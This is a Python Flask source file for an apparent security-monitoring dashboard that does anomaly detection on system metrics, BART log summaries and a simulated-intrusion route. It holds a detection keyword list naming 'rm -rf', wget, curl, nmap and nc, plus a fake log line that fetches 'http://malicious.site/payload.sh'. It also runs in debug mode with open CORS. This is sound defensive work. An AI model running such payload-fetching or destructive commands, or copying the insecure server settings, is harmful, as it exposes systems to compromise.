from flask import Flask, render_template, request, jsonify
from flask_socketio import SocketIO, emit
from notification_generator import generate_notification
import psutil
import eventlet
from sklearn.ensemble import IsolationForest
import numpy as np
import random
import requests
import os
from transformers import BartTokenizer, BartForConditionalGeneration
from datetime import datetime

bart_tokenizer = BartTokenizer.from_pretrained("facebook/bart-large-cnn")
bart_model = BartForConditionalGeneration.from_pretrained("facebook/bart-large-cnn")

eventlet.monkey_patch()

app = Flask(__name__)
socketio = SocketIO(app, async_mode='eventlet', cors_allowed_origins="*")

anomaly_model = IsolationForest(contamination=0.1)

attack_logs = []
main_logs = []
user_logs = []

USER_SYSTEM_URL = "http://192.168.45.112:6000/start_attack"

def train_model():
    dummy_data = np.array([[50, 60, 70], [55, 65, 75], [60, 70, 80], [90, 85, 95]])
    anomaly_model.fit(dummy_data)

def detect_anomalies(cpu, memory, disk):
    data = np.array([[cpu, memory, disk]])
    return anomaly_model.predict(data)[0] == -1

def summarize_logs(logs):
    if not logs:
        return "No recent activity to summarize."
    text = " ".join(logs[-20:])
    inputs = bart_tokenizer.encode(text, return_tensors='pt', max_length=1024, truncation=True)
    summary_ids = bart_model.generate(inputs, max_length=100, min_length=30, num_beams=4, length_penalty=2.0)
    return bart_tokenizer.decode(summary_ids[0], skip_special_tokens=True)

def get_system_metrics():
    while True:
        cpu = psutil.cpu_percent()
        memory = psutil.virtual_memory().percent
        disk = psutil.disk_usage('/').percent
        net = psutil.net_io_counters().bytes_sent + psutil.net_io_counters().bytes_recv

        metrics = {"cpu": cpu, "memory": memory, "disk": disk, "network": net, "source": "main_system"}
        socketio.emit("update_main_metrics", metrics)

        log_entry = f"[MAIN] System metrics - CPU: {cpu}%, Memory: {memory}%, Disk: {disk}%"
        main_logs.append(log_entry)

        if detect_anomalies(cpu, memory, disk):
            problem_log = f"[MAIN] High usage detected. CPU: {cpu}%, Memory: {memory}%, Disk: {disk}%"
            alert = generate_notification(problem_log)
            for message in [alert, problem_log]:
                socketio.emit("alert_notification", {"message": message})
                socketio.emit("log_entry", {"log": problem_log})
            attack_logs.append(problem_log)
            main_logs.append(problem_log)

        suspicious_commands = ["rm -rf", "wget http", "curl http", "nmap", "nc"]
        try:
            with open(os.path.expanduser("~/.bash_history"), "r") as history:
                lines = history.readlines()[-10:]
                for cmd in lines:
                    if any(s in cmd for s in suspicious_commands):
                        suspicious_log = f"[MAIN][SUSPICIOUS] User executed dangerous command: {cmd.strip()}"
                        socketio.emit("suspicious_command_log", {"log": suspicious_log})
                        socketio.emit("alert_notification", {"message": suspicious_log})
                        socketio.emit("log_entry", {"log": suspicious_log})
                        attack_logs.append(suspicious_log)
                        main_logs.append(suspicious_log)
                        break
        except Exception as e:
            print("Error reading bash history:", e)

        eventlet.sleep(10)

@app.route("/receive_metrics", methods=["POST"])
def receive_metrics():
    data = request.json
    cpu = data.get("cpu")
    memory = data.get("memory")
    disk = data.get("disk")
    network = data.get("network")

    socketio.emit("update_user_metrics", {
        "cpu": cpu, "memory": memory, "disk": disk, "network": network, "source": "user_system"
    })

    log_entry = f"[REMOTE] System metrics - CPU: {cpu}%, Memory: {memory}%, Disk: {disk}%"
    user_logs.append(log_entry)

    if detect_anomalies(cpu, memory, disk):
        problem_log = f"[REMOTE] High usage from user system. CPU: {cpu}%, Memory: {memory}%, Disk: {disk}%"
        alert = generate_notification(problem_log)
        socketio.emit("alert_notification", {"message": alert})
        socketio.emit("log_entry", {"log": problem_log})
        attack_logs.append(problem_log)
        user_logs.append(problem_log)

    return jsonify({"status": "received"}), 200

def generate_realistic_logs():
    ips = ["192.168.1.89", "10.0.0.201", "172.16.0.45"]
    users = ["admin", "guest", "root"]
    processes = ["malware_scan.py", "update_patch.py", "sync_data.sh"]
    commands = ["rm -rf /var/tmp", "wget http://malicious.site/payload.sh"]
    return [
        f"[WARNING] Unauthorized login from IP: {random.choice(ips)}",
        f"[ALERT] Root access attempt by user: {random.choice(users)}",
        f"[WARNING] Shell command executed: {random.choice(commands)}",
        f"[CRITICAL] Memory spike in process: {random.choice(processes)}",
        f"[ALERT] Data exfiltration on port 443",
        f"[WARNING] Multiple failed SSH attempts from IP: {random.choice(ips)}"
    ]

@app.route("/simulate_attack", methods=["POST"])
def simulate_attack():
    socketio.emit("suspicious_command_log", {"log": "🔥 Test suspicious command executed"})

    cpu, memory, disk = 95, 90, 88
    net = psutil.net_io_counters().bytes_sent + psutil.net_io_counters().bytes_recv
    socketio.emit("update_main_metrics", {
        "cpu": cpu, "memory": memory, "disk": disk, "network": net, "source": "main_system"
    })

    realistic_logs = generate_realistic_logs()
    for log in realistic_logs:
        socketio.emit("log_entry", {"log": log})
        attack_logs.append(log)
        main_logs.append(log)

        if any(cmd in log for cmd in ["rm -rf", "wget http://malicious.site/payload.sh"]):
            socketio.emit("suspicious_command_log", {"log": f"Suspicious command found: {log}"})

    alert = generate_notification("⚠️ Simulated Intrusion: Suspicious behavior detected")
    socketio.emit("alert_notification", {"message": alert})
    socketio.emit("update_logs", {"logs": attack_logs})

    try:
        requests.post(USER_SYSTEM_URL, timeout=3)
    except Exception as e:
        print("Could not trigger user system attack:", e)

    return "Realistic attack simulated", 200

@app.route("/summarize/main",methods =['POST'])
def summarize_main():
    summary = summarize_logs(main_logs)
    return jsonify({"summary":summary})

@app.route("/summarize/user")
def summarize_user():
    return jsonify({"summary": summarize_logs(user_logs)})

@app.route("/memory_usage_per_process")
def memory_usage_per_process():
    process_list = []
    for proc in psutil.process_iter(['pid', 'name', 'memory_info', 'cpu_percent']):
        try:
            mem_mb = proc.info['memory_info'].rss / (1024 * 1024)
            cpu_pct = proc.info['cpu_percent']
            process_list.append({
                'pid': proc.info['pid'],
                'name': proc.info['name'],
                'memory_mb': round(mem_mb, 2),
                'cpu_percent': cpu_pct
            })
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            continue
    sorted_processes = sorted(process_list, key=lambda x: x['memory_mb'], reverse=True)
    return jsonify(sorted_processes[:10])

@app.route("/")
def index():
    return render_template("login.html")

@app.route("/login/main")
def main_dashboard():
    return render_template("main_dashboard.html")

@app.route("/login/user")
def user_dashboard():
    return render_template("user_dashboard.html")

if __name__ == '__main__':
    train_model()
    socketio.start_background_task(get_system_metrics)
    socketio.run(app, host='0.0.0.0', port=5000, debug=True)
